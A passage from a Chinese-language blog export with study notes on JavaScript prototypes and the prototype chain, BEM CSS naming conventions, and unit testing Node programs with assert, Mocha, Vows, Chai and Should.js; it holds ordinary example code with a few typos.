12function Person()&#123;&#125;console.log(Person === Person.prototype.constructor); // true 更新关系图： 123456function Person()&#123;&#125;var person = new Person();person.__proto__ === Person.prototype;person.prototype.constructor === Person;// 获取对象原型的方法Object.getPrototypeOf(person) === Person.prototype; 实例与原型当读取实例的属性，如果找不到，就会查找对象关联的原型中的属性，如果还查不到。就去找原型的原型，一直找到最顶层位置。 举个例子 1234567function Person() &#123;&#125;Person.prototype.name = 'K';var person = new Person();person.name = 'D';person.name; // 'D'delete person.name;person.name // 'K' 上面的例子中，我们给实例对象 person 添加了 name 属性，当我们打印 person.name 的时候，结果自然是 D，但是当我们删除了 person 的 name 属性后。读取 person.name ，从 person 对象中找不到 name 属性就会从 person 的原型，也就是 person.__proto__,也就是 Person.prototype 中查找，找到了 K。 但是万一没有找到呢，那么原型的原型又是什么？ 原型的原型原型是一个对象，既然是对象，就可以用最原始的方式创建它，那就是： 123var obj = new Object();obj.name = 'K';obj.name // K 其实原型对象就是通过 Object 构造函数生成的，结合之前的，实例的 __proto__ 指向函数的 prototype,更新一下关系图 原型链那 Object.prototype 的原型呢？ null,可以通过打印验证： 1Object.prototype.__proto__ === null // true 然后 null 究竟代表了什么？ null 代表没有对象，即该处不应该有值。 所以 Object.prototype.__proto__ 的值为 null 跟 Object.prototype 没有原型其实表达了一个意思。 所以最后一张关系图就可以停止查找了。 图中相互关联的原型组成的链状结构就是原型链，也就是蓝色这条线。 补充constructorconstructor 是部署在 Object.prototype 上的属性，位于原型链的最高一层（再高一层是null）。任何对象（包括函数，都有 constructor 属性），任何一个 prototype 对象都有一个 constructor 属性，指向它的构造函数。每一个实例也有一个 constructor 属性（原型包含 constructor 属性，因为可以通过对象的实例访问），默认调用 prototype 对象的 constructor 属性，即也指向它的构造函数。 123function Person()&#123;&#125;var person = new Person();person.constructor === Person; // true 当获取 person.constructor 时，其实 person 中并没有 constructor 属性，当不能读取到 constructor 属性时，会从 person 的原型，也就是 Person.prototype.constructor 获取，正好原型有该属性，所以 1person.constructor === Person.prototype.constructor __proto__绝大部分的浏览器都支持这个非标准的方法访问原型，然而它并不存在于 Person.prototype 中，实际上，它是来自 Object.prototype ，与其说是一个属性，不如说是一个 getter/setter 。当使用 obj.__proto__ 时，可以理解为返回了 Object.getPrototypeOf(obj)。 该属性也没有正式写入 ES6 的正文中，而是写入了附录。原因是 __proto__前后的下划线，说明它本质上是一个内部属性，而不是一个正式对外的 API。只是由于浏览器广泛支持才加入了 ES6 。标准明确规定，只有浏览器必须部署这个属性，其他运行环境不一定要部署，而且新的代码最好认为这个属性是不存在的。因为无从从语义上还是从兼容性上，都尽量不要使用这个属性。而是使用下面的 这些方法来作代替： Object.setPrototypeOf()：写操作 Object.getPrototypeOf()：读操作 Object.create()：生成操作 实际上，__proto__ 调用的是 Object.prototype.__proto__，具体的实现如下. 123456789101112131415161718192021222324Object.defineProperty(Object.prototype,'__proto__',&#123; get()&#123; let _thisObj = Object(this); return Object.getPrototypeOf(_thisObj); &#125;, set(proto)&#123; if(this === undefined || this === null)&#123; throw new TypeError(); &#125; if(!isObject(this))&#123; return undefined; &#125; if(!isObject(proto))&#123; return undefined; &#125; let status = Reflect.setPrototype(this,proto); if(!status)&#123; throw new TypeError(); &#125; &#125;&#125;);function isObject(value)&#123; return Object(value) === value; &#125; 真的是继承吗前面提到，每一个对象都会从原型 “继承” 属性，实际上，继承是一个具有迷惑性的说法，继承以为是复制操作，r然而 JavaScript 默认并不会复制对象的属性，相反，JavaScript 只是在两个对象之间创建一个关联，这样，一个对象可以通过委托访问另一个对象的属性和函数。所以与其叫做继承，委托的说法反而更准确一点。 补充完整图Object 是一个函数对象，也是 Function 构造的，Object.prototype 是一个普通对象。Function.prototype 是一个函数对象，之前讨论的函数对象都有一个显示的 prototype 属性，但是 Function.prototype 却没有 prototype 属性，就是 Function.prototype.prototype === undefined ，所有 Function.prototype 函数对象都是一个特例，没有 prototype 属性。 相关的函数instanceof 原理instanceof 是判断实例对象的 __proto__ 和生成该实例的 prototype （也是实例对象和原型对象之间）是不是引用的同一个地址，是的会就返回 true,不是就返回 false。 new 运算符new 运算符的原理 一个新对象被创建，它继承自 foo.Prototype 构造函数返回一个对象，在执行的时候，相应的参数会被传入，同时上下文（this）会被指定为这个新的实例 new foo 等同于 new Foo(),只能用在不传递任何参数的情况下 如果构造函数返回了一个对象，那么这个对象会取代整个 new 出来的结果。如果构造函数没有返回对象，那这个 new 出来的结果则为步骤1创建的对象。 12345var myNew = function(func)&#123; var o = Object.create(func.prototype); // 创建对象 var k = func.call(o); // 改变 this 的指向，把结果给 k return (typeof k === 'object' ? k : o); // 判断 k 的类型是不是对象，如果是就返回 k，不是则返回原来的对象 o&#125; 通过简单的检验，可以知道上面这个 myNew 函数跟 new 运算符的作用是一样的。 isPrototypeOf()这个方法，用来判断某个 prototype对象和实例之间的关系。 hasOwnProperty()每个实例对象都一个 hasOwnPerperty()方法，用来判断某一个属性是本地的，还是继承自 prototype对象的属性。 in 操作符in 操作符可以用来判断，某个实例是否有某个属性，不管是不是本地属性。也是为什么在遍历中，不建议使用它的原理，可能会遍历到预想不到的结果，如果真的要使用的话，建议结合 hasOwnProperty()函数来判断是否为本地的属性再作操作。 prototype 和 __proto__所有构造器/函数（也是对象）的 __proto__都指向 Function.prototype,它是一个空函数（Empty function） 123456789101112131415Number.__proto__ === Function.prototype;Boolean.__proto__ === Function.prototype;String.__proto__ === Function.prototype;Object.__proto__ === Function.prototype;Function.__proto__ === Function.prototype;Array.__proto__ === Function.prototype;RegExp.__proto__ === Function.prototype;Rrror.__proto__ === Function.prototype;Date.__proto__ === Function.prototype;// 自定义的function Person()&#123;&#125;const Man = function&#123;&#125;Person.__proto__ === Function.prototype;Man.__proto__ === Function.prototype; JavaScript 中有内置（build-in）构造器/对象共计12个（ES5加入了JSON），剩下的如 global 不能直接访问，Arguments 仅在函数调用时由 JS 引擎创建，Math,JSON 是以对象形式存在的，无需 new .它们的原型指向是 Object.prototype 12Math.__proto__ === Object.prototype;JSON.__proto__ === Object.prototype; 函数也是对象，构造函数也是对象，可以理解为：构造函数是由 Function 构造函数 实例化出来的函数对象。 所有的构造器都来自于 Function.prototype,甚至包括跟构造器 Object 及 Function 本身，所有的构造器都继承了 Function.prototype 的属性及方法。如 length，call,apply,bind。 那么 Function.prototype 的原型指向什么呢? 1Function.prototype.__proto === Object.prototype; 这说明了所有的构造器也都是一个普通的函数，可以给构造器添加/删除属性等。同时它也继承了 Object.prototype 上的所有的方法：toString，valueOf,hasOwnProperty 等。 最后 1Object.prototype.__proto__ === null 已经到顶了，实例是没有 prototype 属性的，prototype 只有函数才有的，跟原型链没有关系。 protytypeJavaScript 规定，每一个构造函数都有一个 prototype 属性，指向另一个对象，这个对象的所有属性和方法，都会被构造函数的实例继承。这意味着，我们可以将不变的属性和方法，直接定义到 prototype 对象上。这个属性包含一个对象，所有的实例对象需要共享的属性和方法，都放在这个对象里面，那么不需要共享的属性和方法，就放在构造函数里面。实例对象一旦被创建，将自动引用 prototype 对象的属性和方法。也就是说，实例对象的属性和方法，分成两种，一种是本地的，另一种是引用 protytype 对象的。 apply,call,bind每个函数都包含两个非继承而来的方法：call() 和 apply()，这两个函数设置函数体内 this 对象的值。call 和 apply 是 Function 的方法，第一个参数是 this ,第二个参数是 Function 参数。比如说函数里写了 this，普通调用这个this 可能是 window ,而使用了call 或者是 apply 。第一个参数写的是什么，里面的this 就是什么（即改变 this 的指向）。 call 和 apply 都是为了改变某个函数的运行的 context 即上下文而存在的。换句话说，就是为了高边 函数体内的 this 指向。普通函数调用是隐式的传入 this,call 和 apply 可以显式地指定它。call 和 apply 真正强大的地方在于它们能够扩充函数赖以运行的作用域，而且好处在于对象不需要与方法有任何耦合关系。 参考链接：JavaScript 构造函数 prototype属性和proto和原型链 constructor属性 apply(),call()和bind() 关键字this new操作符]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>深入JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BEM 规范]]></title>
    <url>%2F2019-1-09-BEM.html</url>
    <content type="text"><![CDATA[Block，Element 和 Modifiers简介 BEM 含义 例子 Block 独立实体，它本身就是有意义的 header,container,menu,checkbox,input Element 块的一部分，没有独立含义，并且在语义上与其块相关联 menu item,list item,checkbox caption,header title Modifiers 块或元素上的标志。使用它们来改变外观或行为 disabled,highlighted,checked,fixed,size big,color yellow 优点： 模块化：块样式永远不会依赖页面上的其他元素，不会遇到级联问题 可重用性：以不同方式组合块，并智能重用它们，减少了必须维护的 CSS 代码量 结构体：BEM方法为CSS 代码提供了一个简单易懂的结构 用法以及特点Block封装一个独立的实体，本省是有意义的，虽然块相互嵌套并相互交互，但在语义上它们保持相等，没有优先权或等级制度。没有 DOM 表示的整体实体（例如控制器或者模型）也可以是块。 命名 块的名称可以包含 拉丁字母，数字和短划线。要形成 CSS 类，要为 namespacing 添加一个简短的前缀：block。 HTML 如果接受类名，则任何 DOM 节点都可以是块。 1&lt;div class="block"&gt;...&lt;/div&gt; CSS 仅使用类名选择器 没有标签名称或 ID 不依赖页面上的其他块/元素 1.block&#123; color: #ff9; &#125; Element块的一部分并没有独立的含义，任何元素在语义上与其块相关联 命名 元素的名称可以包含拉丁字母，数字，短划线和下划线。CSS 类形成块名称加上两个下划线加上元素名称：.block__elem HTML 块中更多任何 DOM 节点都可以是元素，在给定块内，所有元素在语义上都是相等的。 123&lt;div class="block"&gt; &lt;span class="block__elem"&gt;&lt;/span&gt;&lt;/div&gt; CSS 仅使用类名称选择器 没有标签名称或ID 不依赖页面上的其他块/元素 12345/* 好 */.block__elem &#123; color: #ff9 &#125;/* 坏 */.block .block__elem &#123; color: #ff9 &#125; div.block__elem &#123; color: #ff9 &#125; Modifier块或元素上的标志，使用它们来改变外观，行为或状态 命名 修饰符名称可以包含拉丁字母，数字，段划线或下划线，CSS类形成块的或元素的名称机上两个破折号：block--mod或是 block__elem--mod 和 block--color--black与 .block--color--red .复杂修改器中的空格由短划线替换。 HTML 修饰符是添加到块/元素 DOM 节点的额外类名。仅将修饰符类添加到它们修改的块/元素，并保留原类。 12345678&lt;!--好--&gt;&lt;div class = "block block--mod"&gt; &lt;div class="block block--size--big block-shadow--yes"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!--坏--&gt;&lt;div class="block--mod"&gt; ...&lt;/div&gt; CSS 使用修饰符类名作为选择器： 1.block--hidden &#123; &#125; 要基于块修饰符更改元素: 1.block--mod .block__elem &#123; &#125; 元素修饰： 1.block__elem--mod &#123; &#125; 其他问题有时候可能有嵌套块的情况，翻了很多文章，大概有几个例子: .block-block__element--modifier .block-block--modifier__element--modifier]]></content>
      <categories>
        <category>BEM</category>
      </categories>
      <tags>
        <tag>Bem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 测试 Node 程序]]></title>
    <url>%2F2019-1-07-NodeJs2-Part9.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 测试 Node 程序本章内容 用 Node 的 assert 模块测试 使用其他断言库 使用 Node 单元测试框架 用 Node 模拟并控制 Web 浏览器 在测试失败时获取更多的信息 添加到 程序中的功能越来越多，出现的 bug 的风险就越高。没经过测试的程序是不完整的，而手动测试既繁琐又容易出错，所以自动测试越来越受欢迎。自动测试指的是编写代码来测试代码，而不是手动运行程序中的功能。 两种基本测试：单元测试和验收测试。单元测试直接测试代码逻辑，通常是在函数或方法层面，适用于所有类型的程序。单元测试可以分成两种形态：测试驱动开发（TDD） 和行为驱动开发（BDD）。实事求是地讲，TDD 和 BDD 基本是一样的，它们的区别在于风格上。这个是否重要取决于个人。验收测试一般是对 Web 程序进行的额外的测试，需要用脚本控制浏览器来触发 Web 程序的功能。 TDD 与 BDDBDD ：Behavior Driven Development 行为驱动开发是一种敏捷软件开发的技术，它鼓励软件项目中的开发人员、QA和非技术人员之间的协作。 BDD 的重点是通过与利益相关者的讨论取得对预期软件的行为的清醒认识。它通过用自然语言书写非程序员可读的测试用例扩展了测试驱动开发行为。行为驱动开发人员使用了混合领域中统一的语言的母语语言来描述他们的代码的目的。这让开发者取得以把精力集中在代码应该怎么写，而不是技术细节上，而且也最大程度减少了将代码编写者的技术语言与商业客户、用户、利益相关者、项目管理者等的领域语言之间来回翻译的代价。 TDD：Test-Driven Development 就是测试驱动开发，它是一种测试先于编写代码的思想，用于指导软件开发，测试驱动开发是敏捷开发中的一项核心时间和技术，也是一种方法论，TDD的原理是在开发功能代码之前，先编写单元测试用例，测试代码确定需要编写什么产品代码。 TDD 的基本思路是通过测试来推动整个开发的进行，但测试驱动开发并不只是单纯的测试工作，而是把需求分析，设计，质量控制量化的过程。TDD的重要目的不仅仅是测试软件，测试工作保证代码只是其中一个部分，而且在开发过程中帮助客户和程序员去除模棱两可的需求。TDD 首先考虑使用的需求（对象、功能、过程、接口等）。主要编写的测试用例框架对功能的过程和接口进行设计，而测试框架可以持续进行验证。优点是在任意一个开发节点都可以拿出一个使用，含少量bug 并具有一定功能和能够发布的产品。缺点是增加代码量，测试代码是系统代码的两倍或者更多，但是同时节省了调试程序及挑错的时间。 TDD 的原则： 独立测试：不同的代码的测试应该互相独立，一个类对应一个测试类，一个函数对应一个测试函数。用例也应各自独立，每个用例不能使用其他用例的结果数据，结果也不能依赖用例执行顺序。一个角色，开发过程中包含多种工作，做不同工作时应专注于当前的角色，不要过多考虑其他方面的细节 测试列表：代码的功能点可能很多，并且需求可能是陆续出现的，任何阶段想添加功能时，应把先把功能点加到测试列表中，然后才能继续手头工作，避免疏漏。 测试驱动：即利用测试来驱动开发，是 TDD 的核心。要实现某个功能，要编写某个类或某个函数，应首先编写测试代码，明确这个类、函数如何使用、测试，然后再对其进行设计、编码。 先写断言：编写测试代码时，应该首先编写判断代码功能的断言语句，然后编写必要的辅助语句。 可测试性：产品代码设计、开发时应尽可能提高可测性。每个代码单元的功能应该比较单纯，每个类应该只做它应该做的事情，尤其是增加新功能，不要为图一时的便利，随便在原有代码中添加功能。多考虑使用子类、继承、重载的方法 及时重构：对结构不合理，重复不好的代码，在测试通过后，应及时进行重构。 小步前进：软件开发是复杂性很高的工作，小步前进是降低复杂性的最好的方法。 对于单元测试，会介绍 Node 的 assert 模块、Mocha、Vows、Should.js 框架和 Chai。对于验收测试，我们会介绍Node 中使用 Selenium。 测试类型 分类 工具 描述 单元测试 TDD Mocha/Jasmine/Node 中的 assert 模块/Chai 测试程序逻辑 BDD Mocha/Vows/Chai/Should.js 验收测试 浏览器 WebdriverIO/Selenium 测试程序界面和功能 无头 WebdriverIO/Phantom/Zombie.js 单元测试单元测试是指通过编写代码来测试程序中的各个部分。编写测试代码会让你更认真思考程序的设计选择，尽早避开各种陷阱。测试还会让你确信自己最近的修改没有引入错误。尽管单元测试需要在编码时做些工作，但以后每次修改程序后都不用自己手动测试了，所以还是能节省很多时间的。 做单元测试需要些技巧，而异步逻辑有带来了新的挑战。因为异步单元测试可以并行运行，所以必须小心，确保测试不会互相干扰。比如说，如果测试在硬盘上创建了一个临时文件，那么在完成测试后删除文件时一定要谨慎，以免删除另外一个未完成的测试正在使用过的文件。因此很多单元测试框架都有流程控制，可以让测试按顺序运行。 本节介绍的内容： Node 自带的 assert 模块 —— TDD 风格自动化测试的工具 Mocha —— 相对比较新的测试框架，可以用来做 TDD- 或 BDD-风格的测试 Vows —— 得到广泛应用的 BDD 风格测试框架 Should.js —— 构建在 Node assert 模块之上的模块，提供 BDD 风格的断言 assert 模块assert 模块是 Node 中大多数单元测试的基础，它可以测试一个条件，如果条件未满足，则抛出错误。很多第三方测试框架都用到了 assert 模块，甚至没有测试框架也可以用它做测试。 简单的例子： 假设有一个简单的待办事项程序，它把事项存在内存里，而你要断言它做的是你认为它做的。 下面的代码定义的模块实现了程序的核心功能，包括待办事项的创建、获取和删除。它还包括一个简单的 doAsync 方法，所以还可以看到如何测试异步方法。 123456789101112131415161718192021222324252627// todo.jsclass Todo &#123; constructor() &#123; // 定义待办项数据库 this.todos = []; &#125; add(item) &#123; if (!item) throw new Error('Todo.prototype.add requires an item'); this.todos.push(item); &#125; deleteAll() &#123; this.todos = []; &#125; get length() &#123; return this.todos.length; &#125; // 两秒后带着 true 调用回调 doAsync(cb) &#123; setTimeout(cb, 2000, true); &#125;&#125;module.exports = Todo; 接下里用 assert 模块测试这段代码，下面的代码加载了必需模块，创建了新的待办事项列表，还声明一个变量记录完成的测试数量。 12345// test.jsconst assert = require('assert');const Todo = require('./todo');const todo = new Todo();let testsCompleted = 0; 用 equal 检查变量的值，测试待办事项程序的删除功能 1234567891011// test.jsfunction deleteTest() &#123; // 添加数据来删除 todo.add('Delete Me'); // 断言数据添加成功 assert.equal(todo.length, 1, '1 item should exist'); todo.deleteAll(); assert.equal(todo.length, 0, 'No items should exist'); // 记录测试已完成 testsCompleted++;&#125; 上面的测试添加一个待办事项，然后再删除，所以最后应该没有待办事项。如果程序能正常工作，那么 todo.length 的值应该是 0。如果程序出现问题，则会有异常抛出。如果 todo.length 不是 0.那么这个断言会在栈跟踪中显示一条错误消息，在控制台中输出 ‘No items should exist“，在断言后面将 testCompleted 加一，记录已完成了一次测试。 用 notEqual 找出逻辑中的问题 1234567function addTest() &#123; todo.deleteAll(); todo.add('Added'); // 断言有事项存在 assert.notEqual(todo.length, 0, '1 item should exist'); testsCompleted++;&#125; assest 模块中还有一个 notEqual 断言，当程序产生特定的值表明逻辑有问题时，可以采用这种断言。上面展示了在删除所有待办事项又添加了一个事项，然后再获取所有事项，如果事项的数量为0，断言就会失败并抛出异常。 其他功能：strictEqual、notStrictEqual、deelEqual、notDeepEqual 除了 equal 和 notEqual ,assert 模块还提供了更严格的版本，strictEqual 和 notStrictEqual,它们在进行判断时用的是严格的相等操作符 ===。 assert 模块也有用来比较对象的 deepEqual 和 notEqual ，这些断言中的 deep 表明它们会层层深入对两个对象进行比较，比较两个对象的属性，如果属性也是对象，则会继续比较属性的属性。 用 ok 测试异步值是否为 true 因为是异步测试，所以要提供一个回调函数（cb），向测试运行者发送测试结束的信号——不能像同步测试那样靠返回语句来表明测试结束了。要判断 doAsync 的结果值是否为 true,可以用 ok 断言，用它判断一个值是否为 true 很容易。 12345678function doAsyncTest(cb) &#123; todo.doAsync(value =&gt; &#123; // 断言值为 true assert.ok(value, 'Callback should be passed true'); testsCompleted++; cb(); &#125;);&#125; 测试能否正确抛出错误 assert 模块还可以检查程序抛出消息 是否正确。throws 调用中的第二个参数是一个正则表达式，表示要在错误消息中检查文本 requires 1234function throwsTest(cb) &#123; assert.throws(todo.add, /requires/); testsCompleted++;&#125; 运行测试 测试已经定义好了，接下来要在测试文件中添加运行这些测试的代码，下面的代码会运行前面的定义的所有测试，然后输出完成的测试数量。 123456deleteTest();addTest();throwsTest();doAsyncTest(() =&gt; &#123; console.log(`Completed $&#123;testsCompleted&#125; tests`);&#125;) 如果测试成功了，脚本会告诉你以完成的测试数量。要防止某个测试出问题，可以追踪测试的开始和结束时间。比如说，某个测试可能没能执行到断言的地方。 使用 Node 自带的 assert 模块时，每个测试用例中都要包含很多套路化的代码用以设置测试（比如删除所有事项），追踪测试进程（’已完成‘计数器）。这些套路化的代码会占用编写测试用例的时间和精力。如果能把这些工作交给专用的框架，让你的精力都放在业务员逻辑的测试上就更好。接下来用 Mocha,了解一下如何使用这个第三方单玉测试框架让 工作变得更加轻松。 MochaMocha 是个流行的测试框架，很容易上手，尽管 Mocha 默认是 BDD 风格的。但也可以用在 TDD 风格的测试中。Mocha 具有很多特性，包括全局变量泄露检测和客户端测试。 全局变量泄露测试 一般应该不需要整个程序范围内全都可读的全局变量，并且按照编程最佳实践来说，要尽量少用全局变量。但在 ES5中，一不小心就创建了一个全局变量来，只要在声明变量时忘记写 关键字 var ，这个变量就是全局变量了。Mocha 能够发现这种不小心创建出来的全局变量泄露，如果你创建了全局变量，它会在测试时抛出错误。如果你想禁用全局泄露检查，可以运行 mocha 命令时加上 –ignored-leaks 选项。此外，如果要指明要使用的几个全局变量，可以把它们放在 –globals 后面，用逗号隔开。 Mocha 测试默认使用 BDD 风格的函数定义和设置，这些函数包括 describe、it、before、after、beforeEach和 afterEach，另外，Mocha 也有 TDD 接口，用 suite 代替 describe,test代替 it,setup 代替 before ，teardown 代替 after。 用 Mocha测试 Node 程序 初始化 package.json，定义 scripts: 123"scripts": &#123; "test": "mocha" &#125;, 安装依赖： 1npm i -S mocha 测试会放在 test 目录下。Mocha 默认使用 BDD 接口,Mocha 测试的基本结构 12345678// test/memdb.jsconst memdb = require('..');describe('memdb', () =&gt; &#123; describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; &#125;); &#125;);&#125;); Mocha 也支持 TDD 和 qunit 以及 exports 风格的接口，下面是一个例子 123456789module.exports = &#123; 'memdb':&#123; '.saveSync(doc)':&#123; 'should save the document':()=&gt;&#123; &#125; &#125; &#125;&#125; 这些接口提供的功能是一样的，依然用的是默认的 BDD 接口，下面是第一个测试 123456789101112const memdb = require('..');const assert = require('assert');describe('memdb', () =&gt; &#123; describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; const pet = &#123; name: 'Tobi' &#125;; memdb.saveSync(pet); const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pt); &#125;); &#125;);&#125;); 添加 saveSync 功能 1234567891011121314const db = [];exports.saveSync = (doc) =&gt; &#123; db.push(doc);&#125;exports.first = (obj) =&gt; &#123; return db.filter(doc =&gt; &#123; for (let key in obj) &#123; if (doc[key] != obj[key]) &#123; return false; &#125; &#125; return true; &#125;).shift();&#125; describe块被称为测试套件，表示一组相关的测试，它是一个函数，第一个参数是测试套件的名称，第二个参数是一个实际执行的函数。 it块被称为测试用例，表示一个单独的测试，是测试的最小单位，也是一个函数，第一个参数是测试用例的名字，第二个参数是一个实际执行的函数。 所有的测试用例都应该含有一句或多句的断言，它是编写测试用例的关键，断言功能由断言库来实现。 用 Mocha挂钩定义设置和清理逻辑 BDD 接口 beforeEach()、afterEach()、before()和 after()接受回调，可以用来定义设置和清理逻辑。 12345678910111213141516171819202122232425262728293031const memdb = require('..');const assert = require('assert');describe('memdb', () =&gt; &#123; beforeEach(() =&gt; &#123; memdb.clear(); &#125;); describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; const pet = &#123; name: 'Tobi' &#125;; memdb.saveSync(pet); const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pet); &#125;); &#125;); describe('.first(obj)', () =&gt; &#123; it('should return the first matching doc', () =&gt; &#123; const tobi = &#123; name: 'Tobi' &#125;; const loki = &#123; name: 'Loki' &#125;; memdb.saveSync(tobi); memdb.saveSync(loki); let ret = mendb.first(&#123; name: 'Tobi' &#125;); assert(ret == tobi); ret = memdb.first(&#123; name: 'Loki' &#125;); assert(ret == loki); &#125;); &#125;); it('should return null when no doc matches', () =&gt; &#123; const ret = mendb.first(&#123; name: 'Manny' &#125;); assert(ret == null); &#125;);&#125;); 理想的情况下，测试用例不会共享状态，要让 memdb 达到这一状态，只需要在 index.js 中实现 .clear 方法来移除所有的文档就可以了。 123exports.clear = () =&gt; &#123; db.length = 0;&#125; 测试异步逻辑 为了演示异步测试，需要做一些改动，将 saveSync 函数加一个会在短暂延迟之后执行的回调（用来模拟某中异步操作）作为可选的参数： 12345678exports.saveSync = (doc, cb) =&gt; &#123; db.push(doc); if (cb) &#123; setTimeout(() =&gt; &#123; cb(); &#125;, 1000); &#125;&#125; 只要给定义测试逻辑函数添加一个参数，就可以把 Mocha 测试用例定义为异步的。这个参数通常被命名为 done,下面的代码中演示了如何给异步方法 .save() 写测试用例。 12345678910111213describe('asyncronous .saveSync(doc)', () =&gt; &#123; it('should save the document', (done) =&gt; &#123; // 保存文档 const pet = &#123; name: 'Tobi' &#125;; memdb.saveSync(pet, () =&gt; &#123; // 用第一个文档调用回调 const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pet); // 告诉Mocha 这个测试用例完成了 done(); &#125;); &#125;);&#125;); 这个规则适用于所有挂钩，比如给 beforeEach() 挂钩一个清理数据库的回调，Mocha 可以等它调用后再继续，如果调用 done()时它的第一个参数是个错误，Mocha会报告这个错误，并将这个挂钩或测试用例标记为失败： 123beforeEach((done) =&gt; &#123; memdb.clear(done);&#125;); Mocha 的非并行测试 Mocha的测试不是并行测试的，而是一个接一个地测试，虽然这样执行慢，但写起来更容易。Mocha不会让测试运行太长时间，一个测试默认不超过 2000毫秒，超过这个时长会被当做失败的测试。如果有运行时间长的测试，可以用 –timeout 指定一个更大的数值。 不过说到并行的执行测试的框架有一个叫做 Vows的。 Vows跟很多单元测试框架比，在Vows 下写的测试代码结构更加强，Vows想让测试更容易理解和维护。 Vows 用它自己的BDD 属于定义测试结构。按Vows 的定义，一个测试套件中包含一个或多个批次。可以把批次当做是一组相互关联的情境，或者要测试的概念领域。批次和上下文是并行运行的。上下文中可能包含主题、一个或多个誓约，以及/或者一或多个先关联的情境（内部情况也是并行运行的）。主题是跟情境相关的测试逻辑。誓约是对主题结果的测试。 123套件---批次---情境-----主题 |----誓约 |----情境 Vows 跟 Mocha 一样，是专门用来做自动化程序测试的。它们的差别主要体现在风格和并行性上，Vows 测试有特定的结构和术语。 先初始化,并安装依赖 12npm init -ynpm i -S -g vows 修改 package.json test属性 123"scripts": &#123; "test": "vows test/*.js"&#125; 用 Vows 测试程序逻辑 在 Vows 中，既可以运行包含测试逻辑的脚本来触发测试，也可以用 vows 命令行测试运行器。下面这个例子是个独立的测试脚本，用了待办事项程序核心逻辑测试中的一个。 下面的代码创建一个批次，在这个批次中定义了一个情景，情景中定义了一个主题和一个誓约。注意它在主题如何使用回调处理一般逻辑，如果主题不是异步的，可以直接返回值，不用通过回调。 1234567891011121314151617181920// test/todo-test.jsconst vows = require('vows');const assert = require('assert');const Todo = require('../todo');// 批次vows.describe('Todo').addBatch(&#123; // 情景 'when adding an item': &#123; // 主题 topic: () =&gt; &#123; const todo = new Todo(); todo.add('Feed my cat'); return todo; &#125;, // 誓约 'it should exist in my todos': (er, todo) =&gt; &#123; assert.equal(todo.length, 1); &#125; &#125;&#125;).export(module); 12345678910111213141516171819202122232425// todo.jsclass Todo &#123; constructor() &#123; this.todos = []; &#125; add(item) &#123; if (!item) throw new Error('Todo.prototype.add requires an item'); this.todos.push(item); &#125; deleteAll() &#123; this.todos = []; &#125; get length() &#123; return this.todos.length; &#125; doAsync(cb) &#123; setTimeout(cb, 2000, true); &#125;&#125;module.exports = Todo; Vows 提供了完备的测试方案，但仍然可以用别的断言库将不同测试库的功能混合搭配到一起.另外还有一个叫做 Chai的断言库，它可以代替 assert 模块。 ChaiChai 是个流行的断言库，有三个接口：should、expect 和 assert。下面的代码中用到了 assert ，其看起来就像是 Node 自带的 assertion 模块，但它还有用来比较对象、数组和它们的属性的工具。比如用 typeof比较类型，用 property检查某个对象是否有我们想要的属性。 123456789const chai = require('chai');const assert = chai.assert;const foo = 'bar';const tea = &#123; flavors: ['char', 'earl grey', 'pg tips'] &#125;;assert.typeOf(foo, 'string');assert.equal(foo, 'bar');assert.lengthOf(foo, 3);assert.property(tea, 'flavors');assert.lengthOf(tea.flavors, 3); 这个 API 看起来更像是英语句子——声明式风格更冗长，但看起来更加通顺。should 换了种风格：给对象添加属性，这样就不用把断言放在 expect 调用里了 12345const chai = require('chai');chai.should();const foo = 'bar';foo.should.be.a('string');foo.should.equal('bar'); 要用哪个接口取决于项目，如果先写测试，并将其作为项目的文档，详细的 expect 和 should 接口很好用。 Chai 有很多插件，包括一些趁手的工具，比如可以用 promise 写测试代码的 chai-as-promised，以及根据统计方法比较数值的 chai-stats。注意，因为 Chai 是断言库，所以要跟 Mocha 这样的测试运行者配合使用。另一个像 Chai 一样的 BDD 断言库是 Should.js。 Should.jsShould.js 是个断言库，它用类似于 BDD 的风格表示断言，让测试更容易看懂。它的设计初衷是搭配其他测试框架一起用，我们用的例子是编写代码测试一个定制的模块。Should.js 跟其他框架的搭配很容易，因为它只是给 Object.prototype 增加了一个 should属性。这样你就可以写出表达能力更强的断言，比如 user.role.should.equal(‘admin’)，或者 users.should.include(‘rick’)。 比如说，你要编写一个 Node 命令行的小费计算器，在你跟朋友们采用 AA 制付费时，要用它计算每个人该付多少钱。你希望非程序员朋友也能看懂测试计算逻辑的代码，以免他们怀疑你耍诈。 初始化并安装依赖 12npm init -ynpm i --save-dev should 新建并编辑 index.js ，放入实现核心功能的代码，具体来说，消费计算器包含四个辅助函数： addPercentageToEach——按给定的百分比加大数组中的所有数值 sum——计算数组中所有数值的和 percentFormat——将要显示的值变成百分比格式 dollarFormat——将要显示的值变成美元格式 分账时计算小费的逻辑 12345678910111213141516171819202122232425// index.js// 按百分比加大数组元素汇总的数值exports.addPercentageToEach = (prices, percentage) =&gt; &#123; return prices.map(total =&gt; &#123; total = parseFloat(total); return total + (total * percentage) &#125;);&#125;// 计算数组中所有数值的和exports.sum = (prices) =&gt; &#123; return prices.reduce((currentSum, currentValue) =&gt; &#123; return parseFloat(currentSum) + parseFloat(currentValue); &#125;)&#125;// 将要显示的值变成百分比格式exports.percentFormat = (percentage) =&gt; &#123; return parseFloat(percentage) * 100 + '%';&#125;//将要显示的值变成美元格式exports.dollarFormat = (number) =&gt; &#123; return `$$&#123;parseFloat(number).toFixed(2)&#125;`;&#125; 分账时测试计算小费的逻辑 12345678910111213141516171819// test/tips.jsconst tips = require('..');const should = require('should');const tax = 0.12;const tip = 0.15;const prices = [10, 20];const pricesWithTipAndTax = tips.addPercentageToEach(prices, tip + tax);pricesWithTipAndTax[0].should.equal(12.7);pricesWithTipAndTax[1].should.equal(25.4);const totalAmount = 